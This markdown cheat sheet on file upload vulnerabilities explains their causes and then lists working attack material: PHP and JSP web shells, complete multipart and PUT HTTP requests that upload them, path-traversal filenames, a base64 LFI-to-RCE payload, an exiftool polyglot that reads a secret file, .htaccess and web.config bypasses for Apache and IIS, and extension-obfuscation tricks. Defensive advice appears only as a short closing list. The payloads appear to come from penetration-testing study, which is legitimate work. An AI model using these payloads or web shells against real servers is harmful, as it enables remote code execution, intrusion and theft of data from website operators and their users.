# **File Upload Vulnerability**

## **Index**
1. [Description](#description)  
2. [How Does File Upload Vulnerability Occur?](#how-does-file-upload-vulnerability-occur)  
3. [Where to Put a File Upload Payload?](#where-to-put-a-file-upload-payload)  
4. [Examples of HTTP Requests with File Upload Payloads](#examples-of-http-requests-with-file-upload-payloads)  
   - [PHP Web Shell Upload](#1-php-web-shell-upload)  
   - [Image Upload with Embedded PHP Code](#2-image-upload-with-embedded-php-code)  
   - [Bypassing Content-Type Validation](#3-bypassing-content-type-validation)
5. [Uploading Files via Path Traversal Vulnerability](#uploading-files-via-path-traversal-vulnerability)  
6. [Uploading Files Using PUT](#uploading-files-using-put)
7. [PHP Payloads for RCE](#php-payloads-for-rce)  
   - [Normal Payloads](#normal-payloads)  
   - [Exploiting Server Configuration](#exploiting-server-configuration)  
     - [Apache Bypass](#apache-bypass)  
     - [IIS Bypass](#iis-bypass)  
   - [Obfuscating File Extensions](#obfuscating-file-extensions)
8. [Preventing File Upload Vulnerabilities](#preventing-file-upload-vulnerabilities)
---

# **Description**
**File Upload Vulnerability** occurs when a web application allows a user to upload files without properly validating or restricting the file type, content, or destination. This can enable an attacker to upload malicious files, such as web shells, scripts, or executable binaries, leading to remote code execution, data breaches, or defacement.

---

## **How Does File Upload Vulnerability Occur?**

1. **Lack of File Type Validation**: The web application does not check the file type, allowing any kind of file (e.g., PHP, JSP, EXE) to be uploaded.  
2. **Insecure File Storage Location**: Uploaded files are stored in directories that are accessible to the web server, allowing execution of the uploaded code.  
3. **Weak File Name Validation**: The application does not sanitize the file name, allowing special characters or file extensions to be used.  
4. **Content-Type Header Manipulation**: If the application relies solely on the `Content-Type` header to validate the file type, an attacker can manipulate the header to bypass the validation.  
5. **Insufficient Server-Side Checks**: Validation is performed on the client side, which can be easily bypassed by an attacker.

---

## **Where to Put a File Upload Payload?**

The payload is uploaded as a file through an HTTP request where the application allows file uploads. Typically, you upload the payload in places like:
- **Profile picture upload forms**
- **Document upload forms**
- **Image galleries**
- **Resume or CV submission fields**
- **Custom file submission forms**

---

## **Examples of HTTP Requests with File Upload Payloads**

### **1. PHP Web Shell Upload**

Uploading a simple PHP script as a file to get remote code execution.

**Malicious File Content (`shell.php`):**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

**Example HTTP Request:**
```http
POST /upload HTTP/1.1
Host: vulnerable-website.com
Content-Type: multipart/form-data; boundary=---------------------------12345
Content-Length: 221

-----------------------------12345
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET['cmd']); ?>
-----------------------------12345--
```

In this example, the attacker uploads a file named `shell.php` that contains a PHP web shell. If the server stores the file in a web-accessible location, the attacker can execute commands by accessing `http://vulnerable-website.com/uploads/shell.php?cmd=ls`.

---

### **2. Image Upload with Embedded PHP Code**

Uploading an image file that contains embedded PHP code with a manipulated file extension.

**Malicious File Content (`image.php.jpg`):**
```php
<?php system($_GET['cmd']); ?>
```

**Example HTTP Request:**
```http
POST /upload HTTP/1.1
Host: vulnerable-website.com
Content-Type: multipart/form-data; boundary=---------------------------98765
Content-Length: 245

-----------------------------98765
Content-Disposition: form-data; name="file"; filename="image.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
-----------------------------98765--
```

The attacker uploads a file named `image.php.jpg`. If the server incorrectly identifies the file based on its extension rather than content, the attacker may execute commands by navigating to the uploaded file's URL.

---

### **3. Bypassing Content-Type Validation**

Some web applications check the `Content-Type` header to validate the file type. The attacker can manipulate the header to bypass this check.

**Malicious File Content (`shell.jsp`):**
```jsp
<% out.println("Command execution: " + Runtime.getRuntime().exec(request.getParameter("cmd"))); %>
```

**Example HTTP Request:**
```http
POST /upload HTTP/1.1
Host: vulnerable-website.com
Content-Type: multipart/form-data; boundary=---------------------------54321
Content-Length: 256

-----------------------------54321
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: image/jpeg

<% out.println("Command execution: " + Runtime.getRuntime().exec(request.getParameter("cmd"))); %>
-----------------------------54321--
```

Here, the attacker uploads a JSP file disguised with a `Content-Type` of `image/jpeg`, hoping that the server only checks the header and not the actual content of the file.

---

## **Uploading Files via Path Traversal Vulnerability**

In some cases, you can exploit file upload vulnerability via path traversal:  
- `filename="../exploit.php"`  
- URL encoding: `filename="..%2fexploit.php"`

---

## **Uploading Files Using PUT**

```text
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

## **PHP Payloads for RCE**

### **Normal Payloads**
```php
<?php echo file_get_contents('/etc/passwd'); ?> // To read files
<?php system($_GET['cmd']); ?> // For system command
<?php passthru($_GET['cyborg71']); ?> // For system command*
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls // LFI to RCE
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
```

---

### **Exploiting Server Configuration**

#### **Apache Bypass**
```text
Step 1 >>
filename=".htaccess"
Content-Type: text/plain
AddType application/x-httpd-php .shell

Step 2 >>
filename="test.shell"
Content-Type: application/x-httpd-php
<?php system($_GET['cmd']); ?>
```

#### **IIS Bypass**
```text
Step 1 >>
filename="web.config"
Content-Type: text/plain
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap fileExtension=".php" mimeType="application/x-httpd-php" />
        </staticContent>
    </system.webServer>
</configuration>

Step 2 >>
Content-Type: application/x-httpd-php
<?php system($_GET['cmd']); ?>
```

---

### **Obfuscating File Extensions**
```text
.php
.php3
.php4
.php5
.pHp
.shtml
.php.jpg
.php.png
%2Ephp
.php;.jpg
.php;.png  
.php%00.jpg
.php%00.png
.p.phphp
```
---
## **Preventing File Upload Vulnerabilities**

To mitigate file upload vulnerabilities:
1. **Restrict File Types**: Allow only specific, safe file types (e.g., images, documents) and validate the file type server-side.  
2. **Rename Uploaded Files**: Generate unique, randomized file names and avoid using the original file name.  
3. **Store Files Outside the Web Root**: Keep uploaded files outside directories accessible by the web server to prevent direct access.  
4. **Scan Uploaded Files**: Use antivirus or security tools to scan for malicious content.  
5. **Limit File Size and Type**: Set restrictions on the maximum file size and check the content against expected MIME types.

---


